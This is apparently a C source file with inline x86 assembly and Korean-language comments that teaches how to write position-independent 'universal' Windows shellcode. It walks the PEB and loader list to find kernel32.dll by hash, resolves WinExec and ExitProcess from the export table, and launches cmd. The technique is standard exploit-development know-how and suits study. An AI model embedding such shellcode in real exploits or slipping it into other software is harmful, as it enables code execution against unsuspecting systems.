
/*
bool define
*/

#define TRUE 1
#define FALSE 0

/*
SW_SHOW value is for using WinExec API

UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);

UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...

unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);

*/
#define SW_SHOW 5

/*

purpose:		universal-shellcode
programmer:	woohyuk seo (서우혁)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++

universal shellcode는 kernel32.dll이 export하는 주소가 매번 바뀌어서 call하는 주소가 유효하지 않게된다
정적으로 만들어진 일반적인 쉘코드의 한계를 극복하기 위해서 만들어졌다.

kenrel32.dll이 process에 mapping되었을때, 해당 kernel32.dll을 얻어낸다음
함수의 주소를 계산한다.

kernel32.dll이 mapping된 곳은 PEB라고한다.

따라서..

universal shellcode를 만들기 위해서 PEB(process environment block)의 위치를 구해야한다.
PEB의 위치를 구하는 과정에서 fs register를 이용한다.

user mode의 fs register는 현재 프로세서의 TEB(thread environment block) 를 가르키고있다.
kernel mode의 fs register는 KPCR (processor control region) 를 가르키고있다. (앞에 붙는 K의 뜻은 kernel의 약자같다.)
KPCR은 schedule info들이 저장된다. (실행될 스레드들의 정보들, 큐 정보, ... 라고 한다.


fs:0x30위치에 PEB가 존재한다.
구조는 다음과 같다.

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8

  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )

  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

PEB에서 (2 + 1 + 1 + 4 + 4 = 12) 만큼 더하면 PPEB_LDR_DATA Ldr (포인터 변수)의 주소가 나옴
Loade_export가 가르키는 주소에서, (8 + (4 * 3) = 20)  만큼 더하면 LIST_ENTRY InMemoryOrderModuleList 의 주소가 나옴
InMemoryOrderModuleList 은 이중링크를 가지고 있다.

정보는 다음과 같다
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

FLink는 Front Link, BLink는 Back Link라는 뜻임 (맨 마지막 링크는 NULL을 가르키고있음)


각각 링크는 LDR_DATA_TABLE_ENTRY를 가르키고있다.
LDR_DATA_TABLE_ENTRY는 해당 프로세스가 로드한 DLL의 정보를 가지고있다.

정보는 다음과 같다.

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

여기서 주의해야 할 점은, Reserved1멤버부터 계산하지 않고, InMemoryOrderLinks부터 계산하여,  ((4 * 2) + (4 * 2)) = 16byte만큼 더하여 DllBase에 접근해야 한다는 점이다.
이유는 InMemoryOrderLinks는 이중리스트이다, 당연히 계산했을때, Front Link부터 참조될것이다.
Front Link부터 참조됨으로 32비트환경에서의 메모리주소크기 (4byte) 4개 뒤에 DllBase가 존재한다.

DllBase는 mapping된 DLL의 주소를 가지고있다.

DllBase가 가르키는 주소를 register에 참조시키는 방법은 역참조를 사용해야한다.
mov는 레지스터, 변수를 4바이트만큼 복사한다. (movzx, movsx, movs)같은 명령은 4바이트보다 적거나, 큰 바이트를 복사한다.
intel문법에서, 4바이트 역참조의 표현은 다음과 같다. mov register, [register]
DllBase는 LPVOID형식임으로 mov를 사용한다.

*/


int GetApiAddress(int* base, int* _export, const char* FindApiName)
{
	int FindApiNameLength;
	for (FindApiNameLength = 0; FindApiName[FindApiNameLength] != 0; FindApiNameLength++);

	int EAT; //Export Address Table
	int NPT; //Name Pointer Table
	int OT;	 //Ordinal Table

	//get info
	int NumberOfFunction = *(_export + 6);

	EAT = *(_export + 7); //sizeof(int) * 7 (28) Export Address Table RVA
	NPT = *(_export + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
	OT = *(_export + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA

	//Get VA (Virtual Address)
	NPT += (int)base;
	OT += (int)base;
	EAT += (int)base;

	int* ptr = 0;
	int index = 0;

	//Name Pointer Table
	for (;;)
	{
		//Get next API name
		ptr = (int*)NPT + index;
		index++;

		int IsCmp = TRUE;

		//Get name length
		int ApiStringLength = 0;
		for (; ((char*)*ptr + (int)base)[ApiStringLength] != 0; ApiStringLength++);

		//String compare 
		if (FindApiNameLength <= ApiStringLength)
		{
			for (int i = 0; i != ApiStringLength; i++)
			{
				if (((char*)*ptr + (int)base)[i] != FindApiName[i])
				{
					IsCmp = FALSE;
					break;
				}
			}


			if (IsCmp == TRUE)
			{
				//Successfully string compare
				index--;

				break;
			}
		}
	}

	//Get ordinal
	int LoopCount = 1;

	int ExportAddressTableIndex = 0;
	unsigned short** OrdinalPointer = (unsigned short**)&OT;

	for (;;)
	{
		*OrdinalPointer += 1;

		if (LoopCount == index)
		{
			//Successfully get function ordinal
			ExportAddressTableIndex = **OrdinalPointer;
			break;
		}

		LoopCount++;
	}

	//Get EA (Export Address)
	LoopCount = 1;
	int** ReferenceExportAddressTable = (int**)&EAT;

	for (;;)
	{
		if (LoopCount == ExportAddressTableIndex)
		{
			break;
		}

		LoopCount += 1;
	}

	return *(*ReferenceExportAddressTable + LoopCount) + (int)base; //return VA
}

void shellcode()
{
	/*

	example for calculating hash

	const char kernel32_string[] = "KERNEL32.DLL";
	int kernel32_string_hash = 0;

	for (int i = 0; kernel32_string[i] != 0; i++)
	{
		kernel32_string_hash += kernel32_string[i];
	}

	//kernel32_string_hash is 816 (decimal);

	*/

	const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	int* base;
	int* _export;

	__asm
	{
		//eax holds PEB
		//usermode fs register is pointing the PEB
		mov eax, fs:0x30;

		//eax holds LDR address
		mov eax, [eax + 12];
		//LIST_ENTRY InMemoryOrderModuleList
		mov eax, [eax + 20];

	get_next_front_link:;

		//mov FLink (front link)
		mov eax, [eax];

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)

		//ebx holds DllNameLength
		movsx ebx, word ptr[eax + 36];

		//edx holds DllName
		//40	 = name path
		//40 - 8 = full path
		mov edx, [eax + 40];

		//initailize register
		xor esi, esi;
		xor ecx, ecx;

	get_hash_lable:;

		movsx edi, byte ptr[edx + esi];	//a = dll[x]
		add ecx, edi;						//hash += a;

		add esi, 1;		//add index
		cmp esi, ebx;
		//cmp index, DllNameLength
		//if not equals, while
		jne get_hash_lable;

		cmp ecx, kernel32_string_hash; //KERNEL32.DLL string hash value
		// if not equals the KERNEL32.DLL hash
		jne get_next_front_link;

		//if equals the KERNEL32.DLL hash

		//edi holds DllBase (Dll address)
		mov ebx, [eax + 16];

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY

		mov dword ptr[_export], edx;	//._export export table
		mov dword ptr[base], ebx;	//MZ
	}

	int _WinExec = GetApiAddress(base, _export, "WinExec");
	int _ExitProcess = GetApiAddress(base, _export, "ExitProcess");

	const char shell[] = "cmd";

	//call WinExec
	__asm
	{
		push SW_SHOW;

		lea eax, [shell];
		push eax;

		call _WinExec;
	}
	
	//call ExitProcess
	((void (*) (unsigned int))_ExitProcess)(0);

	return;
}


int main()
{
	shellcode();
	return 0;
}